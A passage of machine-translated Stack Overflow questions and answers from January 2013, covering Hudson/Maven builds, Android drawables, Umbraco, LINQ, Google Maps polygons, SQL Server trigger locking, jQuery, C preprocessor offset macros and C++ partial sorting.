[INFO] ------------------------------------------------------------------------
[INFO] Total time: 7.331s
[INFO] Finished at: Mon Jan 14 21:59:06 PST 2013
[INFO] Final Memory: 13M/222M
[INFO] ------------------------------------------------------------------------ 
```

但是当 Hudson 启动自动构建时，这不起作用。我试图加载该bat文件（vsvars32.bat）执行：

```
pushd %VS100COMNTOOLS%
vsvars32.bat
popd 
```

在我开始 maven 进程之前，我知道这是有效的，因为我在控制台输出中看到了这个：

```
C:\Apps\MicrosoftVisualStudio-10.0\Common7\Tools>vsvars32.bat
Setting environment for using Microsoft Visual Studio 2010 x86 tools. 
```

但是每当它到达实际使用 midl 的地步时，我会在 BUILD FAILURE 之后得到这个输出：

```
[INFO] o.h.m.e.h.MavenExecutionResultHandler - Build failed with exception(s)
[INFO] o.h.m.e.h.MavenExecutionResultHandler -     [1] org.apache.maven.lifecycle.LifecycleExecutionException: Failed to execute goal org.codehaus.mojo:exec-maven-plugin:1.2.1:exec (build-tlb) on project interop: Command execution failed.
[DEBUG] Closing connection to remote

[ERROR] Failed to execute goal org.codehaus.mojo:exec-maven-plugin:1.2.1:exec (build-tlb) on project interop: Command execution failed. Cannot run program "midl" (in directory "D:\Hudson\jobs\{project-name}"): CreateProcess error=2, The system cannot find the file specified ->     [Help 1] 
```

我还在 Hudson 配置面板中设置了环境变量对 {VS100COMNTOOLS,C:\Apps\MicrosoftVisualStudio-10.0\Common7\Tools}。我不知道还能做什么，任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-17T16:15:16.110

我终于想通了。Hudson 调用新任务的方式是调用一个新的 cmd 窗口，以便将 %VS100COMNTOOLS%\vsvars32.bat 工具设置在不同的实例中。查看 %MAVEN_HOME%\bin 中的 mvn.bat 它可以让您在之前调用一个 bat 文件：如果存在 "%HOME%\mavenrc_pre.bat" call "%HOME%\mavenrc_pre.bat" 我调用了 %VS100COMNTOOLS%\vsvars32 .bat 在那里，所以每次我们运行 maven 时，也会加载可视化工具。尽管如此，Hudson 似乎并没有通过调用特定的 bat 文件来启动 maven 任务，它以某种方式创建了自己的 maven 实例，而忽略了 mavenrc_pre.bat。解决这个问题的一种方法是创建任务不是作为 Maven 任务，而是作为批处理任务并简单地调用： mvn clean install 这解决了我的问题。

# android - ImageButton中透明图像上的阴影和描边

> ID：14348581
> 
> 赞同：3
> 
> 时间：2013-01-15T23:05:01.580
> 
> 标签：android, imagebutton

我有 ImageButton 里面有一个图标。ImageButton 和图标背景是透明的。

我想知道如何为图标添加阴影？阴影应该能够开/关。

如果有人也可以帮助治疗中风，我将非常感激。

这是我的 imageButton -

```
 <ImageButton
                            android:id="@+id/icon"
                            android:layout_width="140dp"
                            android:layout_height="60dp"
                            android:layout_gravity="center_horizontal"
                            android:layout_weight="0.76"
                            android:background="@android:color/transparent"
                            android:scaleType="fitCenter"
                            android:onClick="showIconSelector"
                            android:src="@drawable/icon_0" /> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-15T23:12:13.063

您应该为此使用可绘制对象。这是一个带有渐变、笔触和圆角的矩形示例。使用这些有很多可能性：

这将被放置在您的可绘制文件夹中，然后可以像引用任何可绘制资源一样被引用。

```
<?xml version="1.0" encoding="utf-8"?>
<shape
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:shape="rectangle">
    <stroke android:width="3dp" android:color="#5C5858" />
    <corners android:radius="5dp" />
    <gradient
      android:startColor="#C0C0C0"
      android:endColor="#808080"
      android:angle="-90" /> 
</shape> 
```

为了使这个在 On\Off 状态下工作，您需要创建一个选择器，它为您要考虑的每个状态使用不同的可绘制对象。

# asp.net - 我可以将 (.net) CMS 插入现有的网站设计吗？

> ID：14348584
> 
> 赞同：1
> 
> 时间：2013-01-15T23:05:07.263
> 
> 标签：asp.net, content-management-system, umbraco, n2cms

我有一个想要与 CMS 集成的网站设计。目前这是静态的 html+css，但是一旦完成，就会有少量的动态内容——菜单、导航等（当然还有创建/编辑页面）。

我想保留我现有的设计，但使用 CMS 来更新部分、添加页面等。

我研究过的所有大型 CMS 似乎都很难改装到现有设计中，而且看起来我必须从头开始使用 CMS 构建我的设计。

是否有可以插入现有设计的 CMS - 例如：通过向页面添加服务器控件？如果不是，那么在 Umbraco 等大型 CMS 中重建我的设计有多难？

我欢迎其他经历过此过程的人提供任何反馈，尤其是 CMS 建议。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T23:11:21.587

如果您正确地设计了您的原始静态网站（将展示和内容充分分离），您应该能够使用您现有的网站作为 CMS 的原材料。任何称职的 CMS 都应该允许您保留原始样式表，或者至少将一些现有元素合并到 CMS 网站设计中。

但是来自 CMS 的页面是*动态生成*的，因此您不能将 CMS 放在现有网站的顶部并期望它无需修改即可工作。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-16T10:17:22.150

如果您使用 Umbraco 并从静态设计开始，您的流程将遵循以下几行：

*   [从MS Web 平台安装程序](http://www.microsoft.com/web/downloads/)安装 Umbraco，这样数据库和配置文件的设置就不会太痛苦了
*   登录 Umbraco 后端
*   在“设置”部分中，为贯穿页面的设计的所有方面（例如导航 UI、SEO 元数据）创建顶级文档类型和模板 - 我通常将此顶级称为网站名称
*   从您的设计中为每个不同的设计创建一个文档类型和模板，并从模板中指定您从顶级模板继承
*   将您的 html 复制到模板中；参考 CSS 文件（Styles 文件夹）和 JS 文件（Scripts 文件夹）
*   转到“内容”部分并为每个模板添加页面并预览它们（您可能需要检查文档类型“允许的孩子”设置）

您现在会发现您可以添加使用您的设计的页面，这些页面现在将成为 .net MasterPages 并存储在您的项目 MasterPages 文件夹中。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-15T23:11:50.233

据我所知，您无法避免必须将静态站点转换为包含一些服务器端组件才能使用动态内容的事实。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-01-16T03:55:17.243

Umbraco CMS 不规定任何标记或设计。事实上，对于较小的项目，我们将采用 HTML/CSS 模板并将其拉入 Umbraco。

使用 Umbraco，您可以使用 Razor、.NET 用户控件、XSLT 或部分视图构建网站的动态部分。

# linq - 列表中的Linq部分匹配？

> ID：14348586
> 
> 赞同：4
> 
> 时间：2013-01-15T23:05:10.103
> 
> 标签：linq, entity-framework, predicatebuilder

我有一个需要在表中匹配的部分字符串列表。我正在使用 PredicateBuilder。

```
var predicate = PredicateBuilder.False<Name>();
List<string> names = new List<string>();
names.Add("test name"); **<===matches**
names.Add("test"); **<=== doesn't match**
predicate = predicate.Or(n => names.Contains(n.Company));
var results = (from n in Names
.AsExpandable()
.Where(predicate)
select(new{ n.Company})); 
```

n.Company = "测试名称"

如果 n.Company 恰好是“测试名称”，这将匹配，但如果我只使用“测试”，则它不匹配。如何匹配 list.Contains 上的部分内容？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-16T01:10:48.310

您应该以这种方式更改代码

```
var predicate = PredicateBuilder.False<Name>();
List<string> names = new List<string>();
names.Add("test name"); 
names.Add("test"); 
foreach(string name in names)    
{
    string temp = name;
    predicate = predicate.Or(n => n.Company.Contains(temp));
}
var results = (from n in Names 
    .AsExpandable()
    .Where(predicate)
    select(new{ n.Company})); 
```

# java - 在 Android 中使用 Google 地图 API V2 实现多边形

> ID：14348589
> 
> 赞同：0
> 
> 时间：2013-01-15T23:05:22.737
> 
> 标签：java, android, google-maps-android-api-2

我在 Android 上实现了 Google 地图 API V2，我得到了要显示的地图和要显示的多边形，使用以下代码：

```
public class MainActivity extends FragmentActivity {
Polygon polygon;
@Override
protected void onCreate(Bundle savedInstanceState) {

super.onCreate(savedInstanceState);
setContentView(R.layout.activity_main);

GoogleMap googleMap;
googleMap = ((SupportMapFragment)(getSupportFragmentManager().findFragmentById(R.id.map))).getMap();
LatLng latLng = new LatLng(35.20418,-90.08342);
googleMap.setMapType(GoogleMap.MAP_TYPE_NORMAL);
googleMap.addMarker(new MarkerOptions()
        .position(latLng)
        .title("My Spot")
        .snippet("This is my spot!")
        .icon(BitmapDescriptorFactory.defaultMarker(BitmapDescriptorFactory.HUE_AZURE)));
googleMap.getUiSettings().setCompassEnabled(true);
googleMap.getUiSettings().setZoomControlsEnabled(true);
googleMap.animateCamera(CameraUpdateFactory.newLatLngZoom(latLng, 10));

int status = GooglePlayServicesUtil.isGooglePlayServicesAvailable(getApplicationContext());
if(status == ConnectionResult.SUCCESS) {
//Success! Do what you want

Log.i("service", "Google play available");
}
else{
Log.i("service", "No Google play available");
}

PolygonOptions rectOptions = new PolygonOptions()
.add(new LatLng(35.25010,-90.08342),
 new LatLng(35.25010,-90.04175),
 new LatLng(35.29177,-90.04175),
 new LatLng(35.29177,-90.08342),
 new LatLng(35.25010,-90.08342));

//Set the rectangle's stroke color to red
 rectOptions.strokeColor(Color.BLUE);
//Set the rectangle's fill to blue
rectOptions.fillColor(Color.CYAN);
rectOptions.strokeWidth(2);
//Get back the mutable Polygon
polygon = googleMap.addPolygon(rectOptions);

}

} 
```

在 Google 地图 API V1 中，该`onTap`方法用于与多边形交互。我的问题是在 version2 中获取 onTap 事件的最佳方式是什么？我已经阅读了 Google 文档，除非我错过了它，否则我没有看到任何内容。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-02-14T07:02:10.720

尝试使用 Polygon 并阅读此链接。

```
https://developers.google.com/maps/documentation/android/reference/com/google/android/gms/maps/model/Polygon

GoogleMap map;

  Polygon polygon = map.addPolygon(new PolygonOptions()
 .add(new LatLng(0, 0), new LatLng(0, 5), new LatLng(3, 5), new LatLng(0, 0))
 .strokeColor(Color.RED)
 .fillColor(Color.BLUE)); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T20:37:35.517

For now you will have to use OnMapClickListener and implement "point inside polygon" algorithm yourself (there are implementations easy to find with google).

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T22:10:38.557

您需要检查多边形的每 2 个连续点的方向以及响应用户单击的方向。这是通过检查由具有第三个坐标 0 的 3 个点组成的矩阵的行列式的符号来完成的。以这个函数为例：

```
public boolean orientation(float lat1, float lon1, float lat2, float lon2, float lat3, float lon3){
     float result = lat1*lon2 + lat2*lon3 + lat3*lon1 - lon2*lat3 - lon3*lat1 - lon1*lat2;
     if(result >= 0) return true;
     else return false;
} 
```

当您为形成边的多边形的所有点调用该函数并且它们都返回相同的结果时 - 该点位于多边形内部。

# sql - 异步执行 SQL 或从触发器更改锁定

> ID：14348593
> 
> 赞同：0
> 
> 时间：2013-01-15T23:05:50.243
> 
> 标签：sql, sql-server, tsql

我有一个来自应用程序的复杂工作单元，它可能将更改作为单个事务提交到 10-15 个表。工作单元在快照隔离下执行。

一些表有一个触发器，它执行存储过程以将消息记录到队列中。该消息包含表名称、键和更改类型。这是提供与 SQL2005 的向后兼容性所必需的，我不能使用内置队列。

问题是我在队列写入存储过程中遇到阻塞和超时。我要么收到一条消息说：

```
Snapshot isolation transaction aborted due to update conflict. You cannot use snapshot isolation to access table 'dbo.tblObjectChanges' directly or indirectly in database 
```

或者我在写入该表时超时。

有没有办法从触发器中更改对（或在其中）执行消息队列写入的存储过程的特定调用的事务隔离？作为最后的手段，我可​​以对存储过程的删除或更新部分进行异步调用吗？

这是存储过程的 SQL：

```
SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO
ALTER PROCEDURE [dbo].[usp_NotifyObjectChanges]
    @ObjectType varchar(20),
    @ObjectKey int,
    @Level int, 
    @InstanceGUID varchar(50),
    @ChangeType int = 2

AS

SET NOCOUNT ON

DECLARE @ObjectChangeID int

--Clean up any messages older than 10 minutes
DELETE from tblObjectChanges Where CreatedTime < DATEADD(MINUTE, -10, GetDate())

--If the object is already in the queue, change the time and instanceID
SELECT @ObjectChangeID =  [ObjectChangeID]  FROM tblObjectChanges WHERE [ObjectType] = @ObjectType AND [ObjectKey] = @ObjectKey AND [Level] = @Level

IF NOT @ObjectChangeID is NULL
BEGIN
    UPDATE [dbo].[tblObjectChanges] SET
        [CreatedTime] = GETDATE(), InstanceGUID = @InstanceGUID 
    WHERE
        [ObjectChangeID] = @ObjectChangeID
END
ELSE
BEGIN
    INSERT INTO [dbo].[tblObjectChanges] (
        [CreatedTime],
        [ObjectType],
        [ObjectKey],
        [Level],
        ChangeType,
        InstanceGUID 
    ) VALUES (
        GETDATE(),
        @ObjectType,
        @ObjectKey,
        @Level,
        @ChangeType,
        @InstanceGUID 
    )
END 
```

tblObjectChanges 的定义：

```
CREATE TABLE [dbo].[tblObjectChanges](
    [CreatedTime] [datetime] NOT NULL,
    [ObjectType] [varchar](20) NOT NULL,
    [ObjectKey] [int] NOT NULL,
    [Rowversion] [timestamp] NOT NULL,
    [Level] [int] NOT NULL,
    [ObjectChangeID] [int] IDENTITY(1,1) NOT NULL,
    [InstanceGUID] [varchar](50) NULL,
    [ChangeType] [int] NOT NULL,
 CONSTRAINT [PK_tblObjectChanges] PRIMARY KEY CLUSTERED 
(
    [ObjectChangeID] ASC
)WITH (PAD_INDEX = OFF, STATISTICS_NORECOMPUTE = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS = ON, ALLOW_PAGE_LOCKS = ON, FILLFACTOR = 80) ON [PRIMARY]
) ON [PRIMARY]

GO 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-16T23:29:23.417

这条线几乎肯定是你的问题：

```
DELETE from tblObjectChanges Where CreatedTime < DATEADD(MINUTE, -10, GetDate()) 
```

这种说法有两个*大*问题。首先，根据您的表定义， CreatedTime 没有被索引。这意味着为了执行此语句，必须扫描整个表，这将导致整个表在它恰好属于的任何事务的持续时间内被锁定。所以在这个列上放一个索引。

第二个问题是，即使使用索引，您也不应该在触发器中执行这样的操作维护任务。除了减慢必须执行它的 OLTP 事务之外，该语句实际上只需要每 5-10 分钟执行一次。相反，您在任何时候（并且*每次*）修改这些表中的任何一个时都执行它。随着您的系统变得更加繁忙，这会增加很多额外的负载。

更好的方法是将这条语句完全从触发器中取出，而是让一个每 5-10 分钟运行一次的 SQL 代理作业来执行此清理操作。如果您在添加索引的同时执行此操作，您的大多数问题应该会消失。

* * *

另一个问题是这个语句：

```
SELECT @ObjectChangeID =  [ObjectChangeID]  FROM tblObjectChanges WHERE [ObjectType] = @ObjectType AND [ObjectKey] = @ObjectKey AND [Level] = @Level 
```

与上面的第一条语句不同，这条语句属于触发器。但是，与第一条语句一样，它也会在负载下（并导致）严重的性能和锁定问题，因为再次，根据您发布的表定义，没有一个正在搜索的列被索引。

解决方案也是在这些列上放置一个附加索引。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-16T02:36:20.977

一些想法：

*   如果可能，将删除移动到单独的计划作业中
*   在 CreatedTime 上添加索引
*   在 ObjectType、ObjectKey、Level 上添加索引
*   将 WITH(UPDLOCK, ROWLOCK) 添加到 SELECT
*   将 WITH(ROWLOCK) 添加到 INSERT 和 UPDATE

您需要测试所有这些以查看有什么帮助。我将按此顺序浏览它们，但请参阅下面的注释。

即使您决定反对这一切，至少在 SELECT 上保留 WITH(UPDLOCK)，否则您可能会丢失更新。

# jquery - jQuery 中的嵌套对象和 $.each()

> ID：14348597
> 
> 赞同：0
> 
> 时间：2013-01-15T23:06:04.043
> 
> 标签：jquery

我正在努力学习更好地构建我的代码，并在学习了一些教程后开始使用下面的模式。

我以这种方式构建了许多常见的 UI 小部件已经取得了相当大的成功，尽管我已经碰到了我的第一堵墙，下面的 .each() 循环似乎实际上并没有遍历每个项目，而是应用了所需的就像它在一次迭代中作用于所有项目一样。

我读过一些关于 $.each 和 objects 的东西，虽然我不确定 $.each，甚至它是否是我应该去的方向。

```
jQuery(document).ready(function($) {

var tabs = {

    trig : $('nav.tab-triggers'),
    content : $('section.tabs-content'),

    init : function() {
        tabs.address([tabs.trig]);
        tabs.address([tabs.content]);
    },

    address : function(item) {
        //for every instance of the item

        $(item).each(function() {
            var i = 1;
            $(this).addClass('tabs-' + i);

            // for ever child element in this instance of the item
            $(this).children().each(function() {
                var count = 1;
                if ( $(this).parent().is('nav') ) {
                    $(this).attr('href', '#tab-' + count);
               } else {
                    $(this).attr('id', 'tab-' + count);
               }

                count++;

            });

            i++;
        });
    },

    display : function () {
        //show hide stuff here.
    }

}

tabs.init();

}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-16T07:38:46.990

所以经过多次试验和错误，我终于让它工作了。

基本上，据我了解，我正在尝试迭代嵌套对象，因此 .each 需要替换为 $.each 方法，其工作方式略有不同。

```
 address : function(obj) {
        // for each obj
        $.each(obj, function(index,value) {
            //for each instance of the trigger / content item in the obj
             $.each(obj[index], function(index2,value2) {
                //add an incrementing class for each matched element
                $(value2).addClass('tabs-' + index2);
                // get the children of each matched element
                var kids = $(value2).children();
                // loop through each of the children
                $.each(kids, function(index3, value3) {
                    // if its parent is a nav element
                    if ( $(value3).parent().is('nav') ) {
                        // add href
                        $(value3).attr('href', '#tab-' + index3);
                    } else {
                        // add matching ids
                        $(value3).attr('id', 'tab-' + index3);
                    }

                });  // end loop through children elements
             }); // end loop through parent elements
        }); // iteration of passed obj
    }, // end address method 
```

这就是新方法——有效。有一个更好的方法吗 ？

# mysql - 在现有列中添加一个数字

> ID：14348600
> 
> 赞同：0
> 
> 时间：2013-01-15T23:06:23.500
> 
> 标签：mysql, sql, sql-update

您好我正在尝试使用以下代码向 SQL 行添加一个数字：

```
SELECT

      RIGHT( '0900000000' + LTRIM( RTRIM( [Leading_Zero_Field_Name] ) ), 10 )

FROM

      [Table_Name] 
```

行号用 9 个数字格式化，如下所示：

```
098928000
097652183
098037207 
```

我想要完成的是在第一个 0 之后添加一个额外的 9，它应该是总共 10 位数字，应该如下所示：

```
0998928000
0997652183
0998037207 
```

现在问题是当我像这样应用上面的代码时：

```
UPDATE

      [Table_Name]

SET

      [Leading_Zero_Field_Name] = RIGHT( '0900000000' + LTRIM( RTRIM( [Leading_Zero_Field_Name] ) ), 10 ) 
```

我得到这个结果：

```
998928000
997652183
998037207 
```

我不知道为什么查询会删除第一个 0 btw 我行的类型是 VARCHAR 我也尝试使用 TEXT 获得相同的结果。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T23:18:48.550

RIGHT 函数根据需要使用来自第一个参数的尽可能多的字符。您现有的数字不需要那么多，只需改变几个：

```
RIGHT( '0900000000' + LTRIM( RTRIM( [Leading_Zero_Field_Name] ) ), 10 ) 
```

至

```
SELECT RIGHT( '09' + LTRIM( RTRIM( Leading_Zero_Field_Name) ), 10 ) 
```

**编辑：**使用您提供的输入：

```
SELECT RIGHT( '09' + LTRIM( RTRIM( 098928000) ), 10 ) 
```

结果

```
0998928000 
```

你的输入长度有变化吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-16T18:12:11.943

SQL Server 有这个称为[`STUFF()`](http://msdn.microsoft.com/en-us/library/ms188043.aspx "东西（事务处理-SQL）"). 它允许您将一个字符串插入到另一个字符串的特定位置。

在您的情况下，在每个值的第二个位置插入的返回结果`9`如下所示：

```
SELECT STUFF(ColumnName, 2, 0, '9') AS NewValue
FROM TableName; 
```

如果你真的想要一个 MySQL 解决方案，正如标签所暗示的那样，请使用该[`INSERT()`](http://dev.mysql.com/doc/refman/5.6/en/string-functions.html#function_insert "插入（）（MySQL）")函数，其参数集与`STUFF()`.

# c - 通过 C 预处理器定义偏移的最佳方法

> ID：14348601
> 
> 赞同：1
> 
> 时间：2013-01-15T23:06:32.193
> 
> 标签：c, c-preprocessor, keil

我想定义一个宏来帮助我自动生成偏移量。像这样的东西：

```
#define MEM_OFFSET(name, size) ...

MEM_OFFSET(param1, 1);
MEM_OFFSET(param2, 2);
MEM_OFFSET(param3, 4);
MEM_OFFSET(param4, 1); 
```

应生成以下代码：

```
const int param1_offset = 0;
const int param2_offset = 1;
const int param3_offset = 3;
const int param4_offset = 7; 
```

或者

```
enum {
  param1_offset = 0,
  param2_offset = 1,
  param3_offset = 3,
  param4_offset = 7,
} 
```

甚至（不可能只使用 C 预处理器，但谁知道；）

```
#define param1_offset 0
#define param2_offset 1
#define param3_offset 3
#define param4_offset 7 
```

是否可以不运行外部 awk/bash/... 脚本？

我正在使用 Keil C51

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-15T23:44:59.967

看来我找到了枚举的解决方案：

```
#define MEM_OFFSET(name, size) \
    name ## _offset, \
    ___tmp__ ## name = name ## _offset + size - 1, // allocate right bound offset and introduce a gap to force compiler to use next available offset

enum {
 MEM_OFFSET(param1, 1)
 MEM_OFFSET(param2, 2)
 MEM_OFFSET(param3, 4)
 MEM_OFFSET(param4, 1)
}; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-16T00:04:00.030

在对您的帖子的评论中，您提到您正在管理 EEPROM 内存映射，因此此答案与管理内存偏移有关，而不是回答您的具体问题。

管理 EEPROM 存储器的一种方法是使用打包结构。即，每个元素之间没有空间。该结构从未实例化，它仅用于偏移计算。

```
typedef struct {
    uint8_t param1;
#ifdef FEATURE_ENABLED
    uint16_t param2;
#endif
    uint8_t param3;
} __packed eeprom_memory_layout_t; 
```

然后，您可以根据需要使用如下代码来确定每个元素的偏移量（未经测试）。这使用了stddef 宏的[offsetof 。](http://en.wikipedia.org/wiki/Offsetof)

```
uint16_t read_param3(void) {
    uint8_t buf;
    eeprom_memory_layout_t * ee;

    /* eeprom_read(offset, size, buf) */
    eeprom_read(offsetof(eeprom_memory_layout_t, param3), sizeof(ee->param3), &buf);

    return buf;
} 
```

请注意，该结构永远不会被实例化。使用这样的结构可以很容易地一目了然地看到你的内存映射，并且可以很容易地使用宏来抽象出对访问`offsetof`和`sizeof`访问期间的调用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-15T23:31:58.120

如果您想根据一些预处理器声明创建多个结构，您可以执行以下操作：

```
#define OFFSET_FOREACH(MODIFIER)    \
    MODIFIER(1)                     \
    MODIFIER(2)                     \
    MODIFIER(3)                     \
    MODIFIER(4)

#define OFFSET_MODIFIER_ENUM(NUM) param##NUM##_offset,
enum 
{
    OFFSET_FOREACH(OFFSET_MODIFIER_ENUM)
}; 
```

然后预处理器将生成以下代码：

```
enum
{
    param1_offset,
    param2_offset,
    param3_offset,
    param4_offset,
} 
```

我相信有人会想出一个很好的预处理器技巧来计算偏移值与它的前辈的总和:)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-16T03:49:17.293

尝试类似：

```
#define OFFSET(x) offsetof(struct {\
char param1[1], param2[2], param3[4], param4[1];\
},x) 
```

然后你可以使用`OFFSET(param1)`，等等，它甚至是一个整数常量表达式。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-01-15T23:35:07.413

如果您在 C 代码中执行此操作，则必须记住`const int`声明不会在 C 中声明*常量*。要声明命名常量，您必须使用`enum`或`#define`。

如果您`int`特别需要常量，那么`enum`会很好用，尽管我的自动生成部分在任何情况下都可能很棘手。在我的脑海中，我只能想出一些丑陋的东西

```
#define MEM_OFFSET_BEGIN(name, size)\
  enum {\
    name##_OFFSET = 0,\
    name##_SIZE__ = size,

#define MEM_OFFSET(name, size, prev_name)\
  name##_OFFSET = prev_name##_OFFSET + prev_name##_SIZE__,\
  name##_SIZE__ = size,

#define MEM_OFFSET_END()\
  }; 
```

接着

```
MEM_OFFSET_BEGIN(param1, 1)
MEM_OFFSET(param2, 2, param1)
MEM_OFFSET(param3, 4, param2)
MEM_OFFSET(param4, 1, param3)
MEM_OFFSET_END() 
```

不用说，它要求下一个偏移量声明按名称引用前一个偏移量声明的事实违背了这个构造的大部分目的。

# c++ - Partially sorting array so last n elements are sorted?

> ID：14348602
> 
> 赞同：7
> 
> 时间：2013-01-15T23:06:34.733
> 
> 标签：c++, sorting, standard-library

Is there a way to perform a partial sort on an array of data so that the last n elements are sorted? By good I mean using the standard library, not implementing my own sort function (this is what I'm doing right now). Example output (using less comparator):

> 2 1 4 || 5 6 8 10

Elements after `||` are all greater than elements than elements before `||`, but only elements to the right of `||` (indices closer to the end of the array) are guaranteed to be sorted.

This is basically a reversal of the std::partial_sort function which sorts the left (first) elements.

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-01-15T23:07:46.820

Use `std::partial_sort` with reverse iterators.

For example:

```
int x[20];
std::iota(std::begin(x), std::end(x), 0);
std::random_shuffle(std::begin(x), std::end(x));

std::reverse_iterator<int*> b(std::end(x)),
                            e(std::begin(x));
std::partial_sort(b, b+10, e, std::greater<int>());
for (auto i : x)
    std::cout << i << ' '; 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-01-16T00:08:16.010

Another possibility instead of `partial_sort` with reverse iterators and std::greater for the comparison would be to use `std::nth_element` to partition the collection, then std::sort to sort the partition you care about:

```
std::vector<int> data{5, 2, 1, 6, 4, 8, 10}; //  your data, shuffled

std::nth_element(data.begin(), data.begin()+2, data.end());

std::sort(data.begin()+2, data.end(); 
```

# jquery - 表中*行组*的 JQuery 交替颜色

> ID：14348603
> 
> 赞同：0
> 
> 时间：2013-01-15T23:06:39.320
> 
> 标签：jquery

我有一个包含多个 TBODY 元素的表（一年中每个月一个），并且想*在 TBODY 元素*中交替行颜色。

为了说明，我有一个具有以下基本结构的表：

```
<table>
  <tbody>
    <tr>
      <th>October</th>
      <th>Total</th>
    </tr>
    <tr>
      <td>Item 1</td>
      <td>500</td>
    </tr>
    <tr>
      <td>Item 2</td>
      <td>1000</td>
    </tr>
    <tr>
      <td>Item 3</td>
      <td>1400</td>
    </tr>
  </tbody>
  <tbody>
    <tr>
      <th>November</th>
      <th>Total</th>
    </tr>
    <tr>
      <td>Item 1</td>
      <td>800</td>
    </tr>
    <tr>
      <td>Item 2</td>
      <td>400</td>
    </tr>
    <tr>
      <td>Item 3</td>
      <td>200</td>
    </tr>
  </tbody>
  ... a <tbody> for all 12 months ...
</table> 
```

以及以下 JQuery 调用：

```
<script type="text/javascript">
    $(function () {
        $("table > tbody > tr:even").addClass("alternate-row");
    });
</script> 
```

但发生的情况是 JQuery 将**整个表**视为一个逻辑组，并将备用行类应用于每个奇数行*，而不管 TBODY*位置如何。

换句话说，我想要的是：

```
October (normal color)
  Item #1 (normal color)
  Item #2 (alt color)
  Item #3 (normal color)
November (normal color)
  Item #1 (normal color)
  Item #2 (alt color)
  Item #3 (normal color)
... etc 
```

相反，我用上面的 JQuery 得到的是：

```
October (alt color)
  Item #1 (normal color)
  Item #2 (alt color)
  Item #3 (normal color)
November (alt color)
  Item #1 (normal color)
  Item #2 (alt color)
  Item #3 (normal color)
... etc 
```

换句话说，由于某种原因，它无法识别 TBODY 选择器。我做错了什么？

谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-15T23:19:03.350

如果我正确理解了这个问题，这可能就是你想要的：

```
$("table > tbody").each( function() {
    $("tr:even:not(:first)", this).addClass("alternate-row");
} ); 
```

[jsfiddle](http://jsfiddle.net/cnfEq/)

您的代码的问题是一次选择所有 TR。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-15T23:44:15.577

看看 OP 的原版“我想要什么”

解决方案看起来更像

```
$(document).ready(function () {
  $("tbody").find("tr:even:not(:first)").addClass("alternate-row");
}); 
```

[小提琴](http://jsfiddle.net/kentcoast/pcDBG/)

# php - CI-HMVC 模板布局

> ID：14348608
> 
> 赞同：0
> 
> 时间：2013-01-15T23:07:07.793
> 
> 标签：php, codeigniter, templates

我开始使用 CodeIgniter 和 HMVC。我可以毫无问题地构建模块 - 整天。

但现在我想要一个简单的 HTML 模板来插入我的模块。有没有关于这样做的好教程？

我只是在构建一个单一的域站点，用户可以登录并使用模板上分配的模块。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T23:30:01.840

我知道有两个不错的。

[http://williamsconcepts.com/ci/codeigniter/libraries/template/reference.html](http://williamsconcepts.com/ci/codeigniter/libraries/template/reference.html)

和 ...

[https://github.com/philsturgeon/codeigniter-template](https://github.com/philsturgeon/codeigniter-template)

# javascript - 什么是影响最大的 jsperf 测试？

> ID：14348610
> 
> 赞同：-3
> 
> 时间：2013-01-15T23:07:17.433
> 
> 标签：javascript, jsperf

是否有任何网站根据其对编程的影响来组织 jsperf 测试？如果没有，您是否发现了一些测试，我会注意到？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-15T23:20:18.437

JSPerf 有一个受欢迎的部分，但我敢肯定，并非所有这些都有影响：

[http://jsperf.com/popular](http://jsperf.com/popular)

# c - 如何创建 makefile 以使用 mpir 和 mpfr 库

> ID：14348611
> 
> 赞同：1
> 
> 时间：2013-01-15T23:07:19.807
> 
> 标签：c, visual-c++, makefile, static-libraries, mpfr

我最近编写了一个使用公共域 mpir 和 mpfr 库的 C 程序。我一直在使用 Microsoft Visual C++ 10.0 编译器在 Windows 上编译它。为了让它发挥作用，我必须执行以下操作：

*   [从http://gladman.plushost.co.uk/oldsite/computing/gmp4win.php](http://gladman.plushost.co.uk/oldsite/computing/gmp4win.php)下载/构建 mpir 和 mpfr 库
*   将文件移动`mpir.h`到`mpfr.h`Microsoft 编译器的 Include 目录中
*   将文件`mpir.lib`、、`mpir.pdb`和移动`mpfr.lib`到`mpfr.pdb`Microsoft 编译器的 lib 目录中
*   `#include` `mpir.h`并且`mpfr.h`在程序中
*   编译使用`cl <..module names..> /link mpir.lib mpfr.lib`

我现在想将我编写的源文件/头文件发送给其他人，以及他们可以用来编译代码并检查它是否工作的 makefile。由于该人不会安装 mpir / mpfr 库，并且可能不会使用相同的编译器，因此我不太确定如何执行此操作。

这是我能做的：

*   将二进制文件`mpir.lib`、、`mpir.pdb`以及源`mpfr.lib`/`mpfr.pdb`头文件发送给他们。

这是我不能做的：

*   将我的整个 Microsoft Visual C++ 10.0 设置发送给他们
